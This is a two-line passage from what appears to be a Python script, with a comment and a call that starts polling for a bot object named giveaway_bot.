    # Start polling
    giveaway_bot.start()
